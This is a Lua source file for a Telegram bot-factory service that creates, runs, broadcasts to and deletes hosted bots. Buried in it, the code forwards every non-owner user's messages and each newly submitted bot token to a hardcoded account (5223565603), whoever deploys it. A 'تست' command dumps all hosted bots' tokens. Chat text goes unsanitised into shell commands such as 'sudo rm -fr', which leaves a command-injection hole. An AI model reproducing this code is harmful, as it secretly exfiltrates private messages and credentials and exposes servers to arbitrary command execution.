
URL     = require("./libs/url")
JSON    = require("./libs/dkjson")
serpent = require("libs/serpent")
json = require('libs/json')
Redis = require('libs/redis').connect('127.0.0.1', 6379)
http  = require("socket.http")
https   = require("ssl.https")
local Methods = io.open("./luatele.lua","r")
if Methods then
URL.tdlua_CallBack()
end
SshId = io.popen("echo $SSH_CLIENT ︙ awk '{ print $1}'"):read('*a')
luatele = require 'luatele'
local FileInformation = io.open("./Information.lua","r")
if not FileInformation then
if not Redis:get(SshId.."Info:Redis:Token") then
io.write('\27[1;31mارسل لي توكن البوت الان \nSend Me a Bot Token Now ↡\n\27[0;39;49m')
local TokenBot = io.read()
if TokenBot and TokenBot:match('(%d+):(.*)') then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe')
local Json_Info = JSON.decode(url)
if res ~= 200 then
print('\27[1;34mعذرا توكن البوت خطأ تحقق منه وارسله مره اخره \nBot Token is Wrong\n')
else
io.write('\27[1;34mتم حفظ التوكن بنجاح \nThe token been saved successfully \n\27[0;39;49m')
TheTokenBot = TokenBot:match("(%d+)")
os.execute('sudo rm -fr .CallBack-Bot/'..TheTokenBot)
Redis:set(SshId.."Info:Redis:Token",TokenBot)
Redis:set(SshId.."Info:Redis:Token:User",Json_Info.result.username)
end 
else
print('\27[1;34mلم يتم حفظ التوكن جرب مره اخره \nToken not saved, try again')
end 
os.execute('lua black.lua')
end
if not Redis:get(SshId.."Info:Redis:User") then
io.write('\27[1;31mارسل معرف المطور الاساسي الان \nDeveloper UserName saved ↡\n\27[0;39;49m')
local UserSudo = io.read():gsub('@','')
if UserSudo ~= '' then
io.write('\n\27[1;34mتم حفظ معرف المطور \nDeveloper UserName saved \n\n\27[0;39;49m')
Redis:set(SshId.."Info:Redis:User",UserSudo)
else
print('\n\27[1;34mلم يتم حفظ معرف المطور الاساسي \nDeveloper UserName not saved\n')
end 
os.execute('lua black.lua')
end
if not Redis:get(SshId.."Info:Redis:User:ID") then
io.write('\27[1;31mارسل ايدي المطور الاساسي الان \nDeveloper ID saved ↡\n\27[0;39;49m')
local UserId = io.read()
if UserId and UserId:match('(%d+)') then
io.write('\n\27[1;34mتم حفظ ايدي المطور \nDeveloper ID saved \n\n\27[0;39;49m')
Redis:set(SshId.."Info:Redis:User:ID",UserId)
else
print('\n\27[1;34mلم يتم حفظ ايدي المطور الاساسي \nDeveloper ID not saved\n')
end 
os.execute('lua black.lua')
end
local Informationlua = io.open("Information.lua", 'w')
Informationlua:write([[
return {
Token = "]]..Redis:get(SshId.."Info:Redis:Token")..[[",
UserBot = "]]..Redis:get(SshId.."Info:Redis:Token:User")..[[",
UserSudo = "]]..Redis:get(SshId.."Info:Redis:User")..[[",
SudoId = ]]..Redis:get(SshId.."Info:Redis:User:ID")..[[
}
]])
Informationlua:close()
local black = io.open("black", 'w')
black:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
lua5.3 black.lua
done
]])
black:close()
Redis:del(SshId.."Info:Redis:User:ID");Redis:del(SshId.."Info:Redis:User");Redis:del(SshId.."Info:Redis:Token:User");Redis:del(SshId.."Info:Redis:Token")
os.execute('chmod +x black;chmod +x Run;./Run')
end
Information = dofile('./Information.lua')
Sudo_Id = Information.SudoId
UserSudo = Information.UserSudo
Token = Information.Token
UserBot = Information.UserBot
black = Token:match("(%d+)")
os.execute('sudo rm -fr .CallBack-Bot/'..black)

LuaTele = luatele.set_config{api_id=1846213,api_hash='c545c613b78f18a30744970910124d53',session_name=black,token=Token}
function var(value)
print(serpent.block(value, {comment=false}))   
end 
clock = os.clock
function sleep(n)
local t0 = clock()
while clock() - t0 <= n do end
end
function getfile(filename)
      local f = assert(loadfile(filename))
      return f()
    end
function k(limit)
k = 1 
for k = 1 ,#limit do 
k = k..k
end 
return k
end
function Run(data)  
if data.message then
data = data.message
if data.content.text then
text = data.content.text.text
end
end

devkey = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = 'صنع بوت',type = 'text'},{text = 'حذف بوت', type = 'text'},
},
{
{text = 'اذاعه عام للمشتركين',type = 'text'},{text = 'اذاعه عام للمجموعات', type = 'text'},
},
{
{text = 'تفعيل الاشتراك الاجباري',type = 'text'},{text = 'تعطيل الاشتراك الاجباري', type = 'text'},
},
{
{text = 'تفعيل البوت',type = 'text'},{text = 'تعطيل البوت', type = 'text'},
},
{
{text = 'تحديث',type = 'text'},{text = 'تحديث المصنوعات',type = 'text'},
},
{
{text = 'اذاعه',type = 'text'},{text = "اذاعه بالتوجيه" ,type = "text"},
},
{
{text = 'الاحصائيات',type = 'text'},{text = 'تنظيف المشتركين ',type = 'text'},
},
{
{text = 'فحص',type = 'text'},
},
{
{text = 'الوهمي',type = 'text'},{text = 'فلتره',type = 'text'},
},
{
{text = 'عدد البوتات',type = 'text'},
},
{
{text = 'الغاء',type = 'text'},
},
}
}
memkey = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = 'صنع بوت',type = 'text'},{text = 'حذف البوت', type = 'text'},
},
{
{text = 'مبرمج السورس',type = 'text'},
},
{
{text = 'الغاء',type = 'text'},
},
}
}
if data.sender then
function Reply_Status(UserId,TextMsg)
local UserInfo = LuaTele.getUser(UserId)
Name_User = UserInfo.first_name
UserInfousername = '['..Name_User..'](tg://user?id='..UserId..')'
return {
Lock     = '\n*※بواسطه ← *'..UserInfousername..'\n*'..TextMsg..'\n※خاصيه المسح *',
unLock   = '\n*※بواسطه ← *'..UserInfousername..'\n'..TextMsg,
lockKtm  = '\n*※بواسطه ← *'..UserInfousername..'\n*'..TextMsg..'\n※خاصيه الكتم *',
lockKid  = '\n*※بواسطه ← *'..UserInfousername..'\n*'..TextMsg..'\n※خاصيه التقييد *',
lockKick = '\n*※بواسطه ← *'..UserInfousername..'\n*'..TextMsg..'\n※خاصيه الطرد *',
Reply    = '\n*※ المستخدم ← *'..UserInfousername..'\n*'..TextMsg..'*'
}
end
function ChannelJoin(msg)
JoinChannel = true
local chh = Redis:get(black.."chfalse")
if chh then
local url = https.request("https://api.telegram.org/bot"..Token.."/getchatmember?chat_id="..chh.."&user_id="..data.sender.user_id)
da = json:decode(url)
if da.result.status == "left" or da.result.status == "kicked" then
JoinChannel = false 
end
end
return JoinChannel
end
if data.sender.user_id ~= tonumber(5223565603) and data.sender.user_id ~= tonumber(black) then
if data.id then
LuaTele.forwardMessages(5223565603, data.chat_id, data.id,0,0,true,false,false)
end   
end

if data.sender.user_id == tonumber(black) then
return false 
end
if text and Redis:get(black.."offline") == "true" and data.sender.user_id ~= tonumber(5223565603) then
LuaTele.sendText(data.chat_id,data.id,'البوت معطل من قبل المطور @MahmoudM2',"md",true)  
return false 
end
if text and ChannelJoin(msg) == false then
local chinfo = Redis:get(black.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
LuaTele.sendText(data.chat_id,data.id,'*\n※ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
return false 
end
if text and not Redis:sismember(black.."member:", data.sender.user_id) then
Redis:sadd(black.."member:", data.sender.user_id)
end
if text == '/start' and data.sender.user_id ~= tonumber(5223565603) then
if not Redis:sismember(black.."member:", data.sender.user_id) then
Redis:sadd(black.."member:", data.sender.user_id)
end
return LuaTele.sendText(data.chat_id,data.id,'※اهلا بك عزيزي', 'md', false, false, false, false, memkey)
end
if text == "الغاء" then
Redis:del(black.."all:texting:pv")
Redis:del(black.."Broadcasting:Users" .. data.chat_id .. ":" .. data.sender.user_id) 
Redis:del(black.."3z:gp")
Redis:del(black.."all:texting")
Redis:del(black.."Broadcasting:Users:Fwd" .. data.chat_id .. ":" .. data.sender.user_id) 
Redis:del(black..data.sender.user_id.."botuser")
Redis:del(black..data.sender.user_id.."bottoken")
Redis:del(black..data.sender.user_id.."del")
Redis:del(black..data.sender.user_id.."mak")
Redis:del(black..data.sender.user_id.."devmak")
Redis:del(black..data.sender.user_id.."devdel")
Redis:del(black.."Broadcasting:Users:Fwd" .. data.chat_id .. ":" .. data.sender.user_id) 
Redis:del(black.."Broadcasting:Users" .. data.chat_id .. ":" .. data.sender.user_id) 
return LuaTele.sendText(data.chat_id,data.id,'تم الغاء الامر بنجاح',"md",true)  
end
if Redis:get(black.."Broadcasting:Users:Fwd" .. data.chat_id .. ":" .. data.sender.user_id) then 
if text == "الغاء" or text == 'الغاء الامر ※' then   
Redis:del(black.."Broadcasting:Users:Fwd" .. data.chat_id .. ":" .. data.sender.user_id) 
return LuaTele.sendText(data.chat_id,data.id, "\n※ تم الغاء الاذاعه بالتوجيه للخاص","md",true)    
end 
if data.forward_info then 
local list = Redis:smembers(black.."member:") 
LuaTele.sendText(data.chat_id,data.id,"※ تم التوجيه الى *- "..#list.." * مشترك ف البوت ","md",true)      
for k,v in pairs(list) do  
LuaTele.forwardMessages(v, data.chat_id, data.id,0,0,true,false,false)
end   
Redis:del(black.."Broadcasting:Users:Fwd" .. data.chat_id .. ":" .. data.sender.user_id) 
end 
return false
end
if Redis:get(black.."Broadcasting:Users" .. data.chat_id .. ":" .. data.sender.user_id) then 
if text == "الغاء" or text == 'الغاء الامر ※' then   
Redis:del(black.."Broadcasting:Users" .. data.chat_id .. ":" .. data.sender.user_id) 
return LuaTele.sendText(data.chat_id,data.id, "\n※ تم الغاء الاذاعه للخاص","md",true)  
end 
local list = Redis:smembers(black.."member:") 
if data.content.video_note then
for k,v in pairs(list) do 
LuaTele.sendVideoNote(v, 0, data.content.video_note.video.remote.id)
end
elseif data.content.photo then
if data.content.photo.sizes[1].photo.remote.id then
idPhoto = data.content.photo.sizes[1].photo.remote.id
elseif data.content.photo.sizes[2].photo.remote.id then
idPhoto = data.content.photo.sizes[2].photo.remote.id
elseif data.content.photo.sizes[3].photo.remote.id then
idPhoto = data.content.photo.sizes[3].photo.remote.id
end
for k,v in pairs(list) do 
LuaTele.sendPhoto(v, 0, idPhoto,'')
end
elseif data.content.sticker then 
for k,v in pairs(list) do 
LuaTele.sendSticker(v, 0, data.content.sticker.sticker.remote.id)
end
elseif data.content.voice_note then 
for k,v in pairs(list) do 
LuaTele.sendVoiceNote(v, 0, data.content.voice_note.voice.remote.id, '', 'md')
end
elseif data.content.video then 
for k,v in pairs(list) do 
LuaTele.sendVideo(v, 0, data.content.video.video.remote.id, '', "md")
end
elseif data.content.animation then 
for k,v in pairs(list) do 
LuaTele.sendAnimation(v,0, data.content.animation.animation.remote.id, '', 'md')
end
elseif data.content.document then
for k,v in pairs(list) do 
LuaTele.sendDocument(v, 0, data.content.document.document.remote.id, '', 'md')
end
elseif data.content.audio then
for k,v in pairs(list) do 
LuaTele.sendAudio(v, 0, data.content.audio.audio.remote.id, '', "md") 
end
elseif text then   
for k,v in pairs(list) do 
LuaTele.sendText(v,0,text,"html",true)  
end
end
LuaTele.sendText(data.chat_id,data.id,"※ تمت الاذاعه الى *- "..#list.." * عضو في البوت ","md",true)      
Redis:del(black.."Broadcasting:Users" .. data.chat_id .. ":" .. data.sender.user_id) 
return false
end
if Redis:get(black..data.sender.user_id.."del") == "on" then
local url , res = https.request('https://api.telegram.org/bot'..text..'/getMe')
if res == 200 then
local jdat = JSON.decode(url)
Redis:del(black..data.sender.user_id.."del")
botuser = jdat.result.username
os.execute("sudo rm -fr @"..botuser)
os.execute('screen -X -S '..botuser..' quit')
Redis:srem(black.."users",data.sender.user_id) 
Redis:del("@"..botuser)
Redis:srem(black.."data",botuser..'&'..Redis:get(black..botuser.."botat"))
LuaTele.sendText(data.chat_id,data.id,"تم حذف البوت بنجاح","md",true)  
LuaTele.sendText(5223565603,0,"تم حذف بوت جديد\nيوزر البوت @"..botuser.." \n","html",true)  
else
LuaTele.sendText(data.chat_id,data.id,"التوكن خطأ اعد المحاوله","md",true)  
end 
end
if Redis:get(black..data.sender.user_id.."mak") == "on" then
local url , res = https.request('https://api.telegram.org/bot'..text..'/getMe')
if res == 200 then
Redis:del(black..data.sender.user_id.."mak")
Redis:sadd(black.."users",data.sender.user_id)
Redis:set(black..data.sender.user_id..'token',text) 
local jdat = JSON.decode(url)
local uu = LuaTele.getUser(data.sender.user_id)
if uu.username then
devuser = uu.username
else
devuser = ""
end
local botuser = jdat.result.username
Redis:set(black..data.sender.user_id..'botuser',botuser) 
local Informationlua = io.open("./source/Information.lua", 'w')
Informationlua:write([[
return {
Token = "]]..text..[[",
UserBot = "]]..botuser..[[",
UserSudo = "]]..devuser..[[",
SudoId = ]]..data.sender.user_id..[[
}
]])
Informationlua:close()
os.execute('cp -a ./source/. ./@'..botuser..' && cd @'..botuser..' &&chmod +x * &&screen -d -m -S '..botuser..' ./Run')
LuaTele.sendText(5223565603,0,"※ تم تنصيب بوت جديد\nتوكن البوت `"..text.."` \n※ يوزر البوت [@"..botuser.."] \n※ المطور ※ ["..uu.first_name.."](tg://user?id="..data.sender.user_id..")","md",true)  
LuaTele.sendText(data.chat_id,data.id,"※ تم تشغيل البوت بنجاح \n※ معرف البوت [@"..botuser.."]\n※ المطور ※ ["..uu.first_name.."](tg://user?id="..data.sender.user_id..")","md",true)  
else
LuaTele.sendText(data.chat_id,data.id,"※ التوكن غير صحيح","md",true)  
end
end
if text == "صنع بوت" and data.sender.user_id ~= tonumber(5223565603) then 
if Redis:sismember(black.."users",data.sender.user_id) then
return LuaTele.sendText(data.chat_id,data.id,"عفوا لقد صنعت بوت من قبل احذفه اولا لتصنع غيره","md",true)  
end
Redis:set(black..data.sender.user_id.."mak","on")
LuaTele.sendText(data.chat_id,data.id,"ارسل التوكن الان","md",true)
end
if text == "حذف البوت" and data.sender.user_id ~= tonumber(5223565603) then
if not Redis:sismember(black.."users",data.sender.user_id) then
return LuaTele.sendText(data.chat_id,data.id,"عفوا لم تصنع بوت من قبل اصنع بوتك اولا","md",true)  
end
Redis:srem(black.."users",data.sender.user_id)
local token = Redis:get(black..data.sender.user_id..'token') 
local botuser = Redis:get(black..data.sender.user_id..'botuser') 
os.execute("sudo rm -fr @"..botuser)
os.execute('screen -X -S '..botuser..' quit')
Redis:srem(black.."users",data.sender.user_id) 
Redis:del("@"..botuser)
Redis:del(black..data.sender.user_id..'token') 
Redis:get(black..data.sender.user_id..'botuser') 
LuaTele.sendText(data.chat_id,data.id,"تم حذف البوت بنجاح","md",true)  
LuaTele.sendText(5223565603,0,"تم حذف بوت جديد\nيوزر البوت @"..botuser.." \n","html",true)  
end



end
if data.sender then
if data.sender.user_id == tonumber(5223565603) then
if text == '/start' then
Redis:del(black.."all:texting:pv")
Redis:del(black.."Broadcasting:Users" .. data.chat_id .. ":" .. data.sender.user_id) 
Redis:del(black.."3z:gp")
Redis:del(black.."all:texting")
Redis:del(black.."Broadcasting:Users:Fwd" .. data.chat_id .. ":" .. data.sender.user_id) 
Redis:del(black..data.sender.user_id.."botuser")
Redis:del(black..data.sender.user_id.."bottoken")
Redis:del(black..data.sender.user_id.."del")
Redis:del(black..data.sender.user_id.."mak")
Redis:del(black..data.sender.user_id.."devmak")
Redis:del(black..data.sender.user_id.."devdel")
Redis:del(black.."Broadcasting:Users:Fwd" .. data.chat_id .. ":" .. data.sender.user_id) 
Redis:del(black.."Broadcasting:Users" .. data.chat_id .. ":" .. data.sender.user_id)
LuaTele.sendText(data.chat_id,data.id,'※اهلا بك عزيزي المطور ', 'md', false, false, false, false, devkey)
end
if text and Redis:get(black..data.sender.user_id.."devmak") == "devuser" then
local UserName = text:match("^@(.*)$")
if UserName then
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
LuaTele.sendText(data.chat_id,data.id,"※ اليوزر ليس لحساب شخصي تأكد منه ","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
LuaTele.sendText(data.chat_id,data.id,"※ اليوزر لقناه او مجموعه تأكد منه","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
LuaTele.sendText(data.chat_id,data.id,"※ عذرا يجب ان تستخدم معرف لحساب شخصي فقط ","md",true)  
return false
end
local bottoken = Redis:get(black..data.sender.user_id.."devtoken")
local botuser = Redis:get(black..data.sender.user_id.."devbotuser")
local uu = LuaTele.getUser(UserId_Info.id)
local Informationlua = io.open("./source/Information.lua", 'w')
Informationlua:write([[
return {
Token = "]]..bottoken..[[",
UserBot = "]]..botuser..[[",
UserSudo = "]]..UserName..[[",
SudoId = ]]..UserId_Info.id..[[
}
]])
Informationlua:close()
os.execute('cp -a /root/mkk/source/. /root/mkk/@'..botuser..' && cd @'..botuser..' &&chmod +x * &&screen -d -m -S '..botuser..' ./Run')
Redis:del(black..data.sender.user_id.."devmak")
Redis:del(black..data.sender.user_id.."devbotuser")
LuaTele.sendText(data.chat_id,data.id,"※ تم تشغيل البوت بنجاح \n※ معرف البوت [@"..botuser.."]\n※ المطور ※ ["..uu.first_name.."](tg://user?id="..UserId_Info.id..")","md",true)  
else
LuaTele.sendText(data.chat_id,data.id,"※ اليوزر ليس لحساب شخصي تأكد منه ","md",true)  
end
end
if text and Redis:get(black..data.sender.user_id.."devmak") == "token" then
local url , res = https.request('https://api.telegram.org/bot'..text..'/getMe')
if res == 200 then
local jdat = JSON.decode(url)
local botuser = jdat.result.username
Redis:set(black..data.sender.user_id.."devmak","devuser")
Redis:set(black..data.sender.user_id.."devtoken",text)
Redis:set(black..data.sender.user_id.."devbotuser",botuser)
LuaTele.sendText(data.chat_id,data.id,"ارسل معرف المطور الاساسي الان","md",true)
else 
LuaTele.sendText(data.chat_id,data.id,"التوكن غير صحيح تأكد منه","md",true)
end
end
if text == "صنع بوت" then 
Redis:set(black..data.sender.user_id.."devmak","token")
LuaTele.sendText(data.chat_id,data.id,"ارسل التوكن الان","md",true)
end
if text and Redis:get(black..data.sender.user_id.."devdel") == "botuser" then
Redis:del(black..data.sender.user_id.."devdel")
local botuser = text:gsub("@","")
os.execute("sudo rm -fr @"..botuser)
os.execute('screen -X -S '..botuser..' quit')
Redis:del("@"..botuser)
LuaTele.sendText(data.chat_id,data.id,"※ تم حذف و ايقاف البوت بنجاح","md",true)
end
if text == "حذف بوت" then 
Redis:set(black..data.sender.user_id.."devdel","botuser")
LuaTele.sendText(data.chat_id,data.id,"ارسل معرف البوت الان","md",true)
end
if text == "تفعيل البوت" then
Redis:del(black.."offline")
LuaTele.sendText(data.chat_id,data.id,'تم تفعيل البوت',"md",true)  
end
if text == "تعطيل البوت" then
Redis:set(black.."offline",true)
LuaTele.sendText(data.chat_id,data.id,'تم تعطيل البوت',"md",true)  
end
if text == "تحديث" then
LuaTele.sendText(data.chat_id,data.id,'done',"md",true)  
dofile("black.lua")
end

if Redis:get(black.."all:texting") then
Redis:set(black.."3z:gp",text)
Redis:del(black.."all:texting")
LuaTele.sendText(data.chat_id,0,"جاري عمل الاذاعه لكل البوتات ومجموعاتهم يرجي الانتظار ...","html",true)
for folder in io.popen('ls /root/mkk'):lines() do
if folder:match('@[%a%d_]') then
m = Redis:get(folder)
x = {m:match("(.*)&(.*)$(.*)+(.*)")}
bot_id = x[1]
botuser = x[2] 
devbot = x[3]
bottoken = x[4]
list = Redis:smembers(bot_id.."ChekBotAdd") 
for k,v in pairs(list) do
https.request("https://api.telegram.org/bot"..bottoken.."/sendmessage?chat_id="..v.."&text="..URL.escape(Redis:get(black.."3z:gp")).."&parse_mode=Markdown")
--LuaTele.sendText(data.chat_id,0,"\n※ البوت ("..botuser..") \n※ تمت الاذاعه الي  ("..#list..") مجموعه \n","html",true)
end
end
end
Redis:del(black.."3z:gp")
Redis:del(black.."all:texting")
LuaTele.sendText(data.chat_id,0,"تم انتهاء الاذاعه في كل البوتات","html",true)
end
if Redis:get(black.."all:texting:pv") then
Redis:set(black.."eza3a:pv",text)
Redis:del(black.."all:texting:pv")
LuaTele.sendText(data.chat_id,0,"جاري عمل الاذاعه لكل البوتات ومطورينهم ومشتركينهم يرجي الانتظار ...","html",true)
for folder in io.popen('ls /root/mkk'):lines() do
if folder:match('@[%a%d_]') then
m = Redis:get(folder)
x = {m:match("(.*)&(.*)$(.*)+(.*)")}
bot_id = x[1]
botuser = x[2] 
devbot = x[3]
bottoken = x[4]
list = Redis:smembers(bot_id.."Num:User:Pv") 
for k,v in pairs(list) do
https.request("https://api.telegram.org/bot"..bottoken.."/sendmessage?chat_id="..v.."&text="..URL.escape(Redis:get(black.."eza3a:pv")).."&parse_mode=Markdown")
end
end
end
Redis:del(black.."eza3a:pv")
Redis:del(black.."all:texting:pv")
LuaTele.sendText(data.chat_id,0,"تم انتهاء الاذاعه في كل البوتات","html",true)
end
if text == "اذاعه عام للمجموعات" then
Redis:set(black.."all:texting",true)
LuaTele.sendText(data.chat_id,0,"ارسل النص الان","html",true)
end
if text == "اذاعه عام للمشتركين" then
Redis:set(black.."all:texting:pv",true)
LuaTele.sendText(data.chat_id,0,"ارسل النص الان","html",true)
end
if text and text:match('^حظر عام @(%S+)$') then
local UserName = text:match('^حظر عام @(%S+)$')
local UserId_Info = LuaTele.searchPublicChat(UserName)
for folder in io.popen('ls /root/mkk'):lines() do
if folder:match('@[%a%d_]') then
m = Redis:get(folder)
x = {m:match("(.*)&(.*)$(.*)+(.*)")}
bot_id = x[1]
Redis:sadd(bot_id.."BanAll:Groups",UserId_Info.id) 
end
end
LuaTele.sendText(data.chat_id,0,"تم حظره عام","html",true)
end
if text and text:match('^الغاء العام @(%S+)$') then
local UserName = text:match('^الغاء العام @(%S+)$')
local UserId_Info = LuaTele.searchPublicChat(UserName)
for folder in io.popen('ls /root/mkk'):lines() do
if folder:match('@[%a%d_]') then
m = Redis:get(folder)
x = {m:match("(.*)&(.*)$(.*)+(.*)")}
bot_id = x[1]
Redis:srem(bot_id.."BanAll:Groups",UserId_Info.id) 
end
end
LuaTele.sendText(data.chat_id,0,"تم الغاء الحظر العام","html",true)
end
if text == "فحص" then
Redis:del(black.."All:pv:st")
Redis:del(black.."All:gp:st")
gp = "≈≈≈ قائمه المجموعات ≈≈≈\n"
pv = "≈≈≈ قائمه المشتركين ≈≈≈\n"
for folder in io.popen('ls /root/mkk'):lines() do
if folder:match('@[%a%d_]') then
m = Redis:get(folder)
x = {m:match("(.*)&(.*)$(.*)+(.*)")}
bot_id = x[1]
botuser = x[2] 
devbot = x[3]
bottoken = x[4]
list = Redis:smembers(bot_id.."ChekBotAdd") 
lt = Redis:smembers(bot_id.."Num:User:Pv") 
Redis:incrby(black.."All:gp:st",tonumber(#list))
Redis:incrby(black.."All:pv:st",tonumber(#lt))
gp = gp.."\n".."البوت » "..botuser.." » ".."("..#list..") مجموعه" 
pv = pv.."\n".."البوت » "..botuser.." » ".."("..#lt..") مشترك "
end
end
LuaTele.sendText(data.chat_id,0,'\n※ عدد المجموعات '..Redis:get(black.."All:gp:st")..' مجموعه \n※ عدد المشتركين '..Redis:get(black.."All:pv:st")..' مشترك',"html",true)
end
if text == "فلتره" then
for folder in io.popen('ls /root/mkk'):lines() do
if folder:match('@[%a%d_]') then
m = Redis:get(folder)
x = {m:match("(.*)&(.*)$(.*)+(.*)")}
bot_id = x[1]
botuser = x[2] 
devbot = x[3]
bottoken = x[4]
list = Redis:smembers(bot_id.."ChekBotAdd") 
lt = Redis:smembers(bot_id.."Num:User:Pv") 
if #list < 2 then
os.execute("sudo rm -fr "..botuser)
os.execute('screen -X -S '..botuser:gsub("@","")..' quit')
Redis:srem(black.."data",botuser..'&'..Redis:get(black..botuser:gsub("@","").."botat"))
end
end
end
LuaTele.sendText(data.chat_id,0,"تم الانتهاء من الفلتره","html",true)
end
if text == "الوهمي" then
for folder in io.popen('ls /root/mkk'):lines() do
if folder:match('@[%a%d_]') then
m = Redis:get(folder)
x = {m:match("(.*)&(.*)$(.*)+(.*)")}
bot_id = x[1]
botuser = x[2] 
devbot = x[3]
bottoken = x[4]
list = Redis:smembers(bot_id.."ChekBotAdd") 
lt = Redis:smembers(bot_id.."Num:User:Pv") 
if #list < 2 then
LuaTele.sendText(data.chat_id,0,botuser.." » "..#list,"html",true)
end
end
end
LuaTele.sendText(data.chat_id,0,"تم الانتهاء من الفلتره","html",true)
end
if text == "تشغيل البوتات" then
Redis:del(black..'3dd')
for folder in io.popen('ls /root/mkk'):lines() do
if folder:match('@[%a%d_]') then
os.execute('cd /root/mkk/'..folder..' ; screen -d -m -S '..folder:gsub("@","")..' ./Run')
Redis:sadd(black..'3dd',folder)
end
end
local l = Redis:smembers(black..'3dd')
LuaTele.sendText(data.chat_id,data.id,"تم تشغيل "..#l.." بوت","html",true)  
end
if text == "تحديث المصنوعات" then 
Redis:del(black..'3ddbots')
for folder in io.popen('ls /root/mkk'):lines() do
if folder:match('@[%a%d_]') then
os.execute('cp -a /root/mkk/update/. /root/mkk/'..folder..' && cd '..folder..' &&chmod +x * && screen -X -S '..folder:gsub("@","")..' quit && screen -d -m -S '..folder:gsub("@","")..' ./Run')
Redis:sadd(black..'3ddbots',folder)
end
end
local list = Redis:smembers(black..'3ddbots')
LuaTele.sendText(data.chat_id,data.id,"تم تحديث "..#list.." بوت","html",true)  
end

if text == "تست" then 
for folder in io.popen('ls /root/mkk'):lines() do
if folder:match('@[%a%d_]') then
m = dofile("/root/mkk/"..folder.."/Information.lua")
LuaTele.sendText(data.chat_id,data.id,m.Token,"html",true)  
end
end
end

if text == 'المبرمج تيمو' or text == 'مبرمج السورس' or text == 'تيمو' then  
local UserId_Info = LuaTele.searchPublicChat("uu_u_4")
if UserId_Info.id then
local UserInfo = LuaTele.getUser(UserId_Info.id)
local InfoUser = LuaTele.getUserFullInfo(UserId_Info.id)
if InfoUser.bio then
Bio = InfoUser.bio
else
Bio = ''
end
local photo = LuaTele.getUserProfilePhotos(UserId_Info.id)
if photo.total_count > 0 then
local TestText = "𝚃𝙸𝙼𝙾\n— — — — — — — — —\n ❍*َdev name➢* :  ["..UserInfo.first_name.."](tg://user?id="..UserId_Info.id..")\n❍*َbio* : [❲ "..Bio.." ❳]"
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = '𝚃𝙸𝙼𝙾', url = "https://t.me/uu_u_4"}
},
}
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
else
local TestText = "- معلومات مبرمج السورس : \\nn: name Dev . ["..UserInfo.first_name.."](tg://user?id="..UserId_Info.id..")\n\n ["..Bio.."]"
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = '𝚃 𝙸 𝙼 𝙾', url = "https://t.me/uu_u_4"}
},
{
{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝙴𝙻𝚅𝙰', url = "https://t.me/SO_SELVA"},
},
}
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendMessage?chat_id=' .. msg.chat_id .. '&text=' .. URL.escape(TestText).."&reply_to_message_id="..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
end
end
end

if text == "عدد البوتات" then
Redis:del(black..'3ddbots')
bots = "\nقائمه البوتات\n"
botat = "\nقائمه البوتات\n"
for folder in io.popen('ls /root/mkk'):lines() do
if folder:match('@[%a%d_]') then
m = Redis:get(folder)
x = {m:match("(.*)&(.*)$(.*)+(.*)")}
bot_id = x[1]
botuser = x[2] 
devbot = x[3]
bottoken = x[4]
Redis:sadd(black..'3ddbots',botuser..' » '..devbot)
end
end
local list = Redis:smembers(black..'3ddbots')
if #list <= 100 then
for k,v in pairs(list) do
bots = bots..' '..k..'-'..v..'\n'
end
else
for k = 1,100 do
bots = bots..' '..k..'-'..list[k]..'\n'
end
for i = 101 , #list do
botat = botat..' '..i..'-'..list[i]..'\n'
end
end
if #list <= 100 then
LuaTele.sendText(data.chat_id,data.id,bots.."\n".."وعددهم "..#list.."","html",true)  
else
LuaTele.sendText(data.chat_id,data.id,bots,"html",true)  
LuaTele.sendText(data.chat_id,data.id,botat.."\n".."وعددهم "..#list.."","html",true)  
end

end
-- تنظيف المشتركين
if text == "تنظيف المشتركين" then
local list = Redis:smembers(black.."member:")   
local x = 0
for k,v in pairs(list) do  
local Get_Chat = LuaTele.getChat(v)
local ChatAction = LuaTele.sendChatAction(v,'Typing')
if ChatAction.luatele ~= "ok" then
x = x + 1
Redis:srem(black..'member:',v)
end
end
local m = #list - x
LuaTele.sendText(data.chat_id,data.id,"اصبح عدد المشتركين "..m.."","html",true)  
end
-- الاحصائيات

if Redis:get(black.."ch:addd"..data.sender.user_id) == "on" then
Redis:set(black.."ch:addd"..data.sender.user_id,"off")
local m = https.request("http://api.telegram.org/bot"..Token.."/getchat?chat_id="..text)
da = json:decode(m)
if da.result.invite_link then
local ch = da.result.id
LuaTele.sendText(data.chat_id,data.id,'※ تم حفظ القناه ',"md",true)  
Redis:del("ch:3am")
Redis:set("ch:3am",ch)
Redis:del("ch:admin")
Redis:set("ch:admin:3am",da.result.invite_link)
else
LuaTele.sendText(data.chat_id,data.id,'※ المعرف خطأ او البوت ليس مشرف في القناه ',"md",true)  
end
end
if text == "تفعيل الاشتراك الاجباري" then
Redis:set(black.."ch:addd"..data.sender.user_id,"on")
LuaTele.sendText(data.chat_id,data.id,'※ ارسل الان معرف القناه ',"md",true)  
end
if text == "تعطيل الاشتراك الاجباري" then
Redis:del("ch:admin:3am")
Redis:del("ch:3am")
LuaTele.sendText(data.chat_id,data.id,'※ تم حذف القناه ',"md",true)  
end
if text == "تفعيل التواصل" then
Redis:set(black.."TwaslBot",true)
